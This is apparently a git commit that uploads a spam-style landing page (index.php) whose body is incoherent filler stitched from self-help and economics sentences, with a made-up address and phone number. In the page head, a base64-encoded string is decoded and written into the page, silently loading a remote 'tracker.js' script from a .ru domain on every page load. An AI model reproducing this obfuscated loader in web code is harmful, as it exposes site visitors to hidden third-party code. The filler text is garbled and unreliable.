2ab8c8461fa5c6ca8f4f8d92a15899a404fa4ce2
stvunuxl <78304367+stvunuxl@users.noreply.github.com>
2021-01-31 14:37:58 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>But the situation of the situation is different.  The family as the object o</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl94cm9sYmsxNW02c2lpeXNwcW8iPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="5cdo8bvstvn230iq46wj2y8">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="eyihyk2d1j8kdk8h22myy">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>But the situation of the situation is different.  The family as the object o</h1>
+	</section>
+
+
+	<section class="our-work" class="efw79jcngqd99ahjs2h1v6to">
+		<h3 class="title">Win / Lose One alternative to the Win / Win approac</h3>
+		<p>Shopkeepers fought to survive - prosperity was out of the question.  Reactive people build their emotional lives on the behavior of those around them, allowing their weaknesses to rule them.The ability to subjugate an impulsive response to one's values ​​is the essence of the projective personality.  Focus on square II.  For most goods, higher incomes increase demand.  Disciple: every day I learn something new and important for myself.  You can also go for “Lose / Win” if you see that it will take such an investment of time and effort to win that more significant values ​​will suffer.  He constantly made contributions of unconditional love, and they gradually permeated the script of his beloved.  Depending on the situation, some oligopolies can act in much the same way as perfectly competitive markets, with prices equal to or close to marginal costs.  Schedule a time to get completely out of your business and start working on your Personal Mission Statement.  The main signs of a shortage are the reduction of inventories and the emergence of queues of buyers. </p>
+		<hr>
+
+		<ul class="grid" class="mar55k83nuaapwn">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="5cdo8bvstvn230iq46wj2y8">
+		<h3 class="title">You are very dependent on the opinions of </h3>
+		<p>Some resources may already be owned by the enterprise.  The old owner gets market value for it, someone else will be ready to pay a high tax, ensuring more efficient use.  These persistent and often unconscious patterns of behavior constantly, day after day, express our character and breed our effectiveness ...  The supply of factors of production depends primarily on the specifics of each market.  By connecting these points, we get a demand graph or demand curve (DD).  When individual values ​​are in harmony with family values, family members work together to achieve common goals that they deeply share.  So are you starting to notice some of the benefits of planning a week versus planning a day? After defining your roles and setting goals, you can associate each of them with a specific day in the form of a specific task.  Let's take a look at each of them separately.  Habit 5 is something you can start practicing right now.  However, what happens when we try to curtail the natural process of our growth and development? Imagine that you, being a very average tennis player, decide to impress those around you by competing with the masters.Where it leads? Will positive thinking alone enable you to effectively confront a professional? What if you can convince your friends that you play the piano at the level of a concert performer, when in reality you are among the beginners? The answer is obvious. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="eyihyk2d1j8kdk8h22myy" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="efw79jcngqd99ahjs2h1v6to">
+		<h3 class="title">Social Victory cannot be achieved with popular negotiation tech</h3>
+		<p>And if our actions are governed by our feelings, this means that we, having relieved ourselves of responsibility, allowed them to do it.  Where did I have breakfast today and with whom? Have I spent the whole morning in class? When was lunch break? Who did I have lunch with? What was the conversation about? What did I do after lunch? How did I entertain myself in the evening? With whom? What were we talking about? ..But most of all, she wants to know - although she does not ask directly about it - who can be called to check everything I tell her.  Using this technique, you may not want to transfer your biography to a relationship with another person, but the very motive for listening will be autobiographical.  The impact on demand of changes in monetary income is somewhat more complex.  There are things like the weather that never make it into our Circle of Influence.  They produce very little and their lifestyles are not conducive to the development of their resources and means (RS) needed to achieve better results (R).  "Do you think Joe will feel like he made the wrong decision?" - And how! Look what he gave up.  The enterprises use a system of scheduled preventive maintenance, including technical and preventive inspections, routine (minor and medium) and major repairs.  - Tell them: "Listen, if you don't want to buy anything, get out of my store!" - No, - said the first, - you can't do that with a buyer!- Why do you think that it is possible with employees? - Because I'm hiring them! - Clear.  - But, son, this is a very prestigious school! Trust your teachers! (Advice, evaluation.) - Other guys think the same way as I do! - You are aware ofhow much did your mom and I donate for your education? You cannot leave school now that so much has already been done and passed! (Appraisal.) - I know, Dad, that you donated a lot. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="mar55k83nuaapwn" style="background-image: url(image3.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="5cdo8bvstvn230iq46wj2y8">
+		<h3 class="title">There are two types of oligopoly: 1) the first assu</h3>
+		<p>Standing behind the cash register, they completed all transactions at a time when trading was slow.  Practice is a special kind of activity or action.  In the shortest market period (Fig.  Capital investments include the cost of construction work of all types; 1) costs of equipment installation; 2) for the purchase of equipment that requires and does not require installation, provided for in the construction estimates; 3) for the purchase of production tools and household equipment included in the construction estimates; 4) for the purchase of machinery and equipment not included in the construction estimates; 5) for other capital work and costs.  Earlier, I shared with you the story of my son, who had serious problems at school.  First of all, this experiment demonstrates how powerfully preoccupation affects our perception, our paradigms.  And he always made sure that the service was impeccable.  One of the most useful practical results of a principle orientation is that we gain inner unity, integrity.  - Nothing like this! We were guided by Win / Win! - Excuse me, but you yourself said that they beat you up! - Well yes! - In other words, you lost! - That's it! - And they won! - Yes! - Well, what is it called? Realizing that what he thought was a Win / Win attitude was actually a Lose / Win attitude, the President was shocked.And when he and I analyzed the long-term consequences of the “Lose / Win” attitude - suppressed emotions, trampled values, resentment creeping into the relationship - we both came to the conclusion that in fact, for each of the parties it was a loss.  Even now, when she is well over eighty, she shows the deepest interest in each of her descendants. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="eyihyk2d1j8kdk8h22myy" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="efw79jcngqd99ahjs2h1v6to">
+		<h3 class="title">You may receive, as golden eggs, temporary</h3>
+		<p>Therefore, a change in the price of one of the resources leads to a change in the prices of other resources.  Non-price factors lead to a change in supply, which is expressed in a shift in the supply curve: to the right, if the supply increases, and to the left, if the supply decreases.Graphically, it looks like this.  Even if people are reluctant to open up and share their concerns, show empathy anyway.  She pushed the knight away from herself like a mad dreamer.  Our conversations with other people turn into collective monologues, and we never really understand what is going on in the soul of these people.  In order to adapt to reality, we do not need to thoroughly calculate everything, put it on the shelves and bring it to a common denominator.  or inefficiency.  Data collection.  This was the last semester of their senior year, and I think they wanted something more than just another class.  2. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="mar55k83nuaapwn" class="title">This is a great honor for me.  Father and mother went through t</h3>	
+		<p>At the same time, many factors that are characteristic of interdependent situations relate to your Circle of Concern: problems, disagreements, circumstances, behavior of other people.  I don't have time right now to explain it to you, let alone discuss it with you.  These are abnormal or low quality products.  For example, my family life.  You can take steps to love and forgive your parents, and if they are still alive, by seeking to understand them, establish a positive relationship with them.  On the threshold of the XXI century.  Linear demand curve.  Then I asked which of them would never forget these people, who had changed - at least for a while - inspired by such courage, who were deeply impressed by it and moved to their own manifestations of service and compassion.  I can imagine the dress my daughter was wearing and the look on her face.  Win / Win is fundamental to success in all our interactions and encompasses the five interdependent dimensions of life. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="5cdo8bvstvn230iq46wj2y8">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="eyihyk2d1j8kdk8h22myy"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="efw79jcngqd99ahjs2h1v6to"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="mar55k83nuaapwn"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>547 Rau Fords, Apt. 049, 43206-8953, South Paxton, North Dakota, United States</p>
+		<p>Phone number: +55(79)504-34-92679</p>
+	</footer>
+
+</body>
+
+</html>
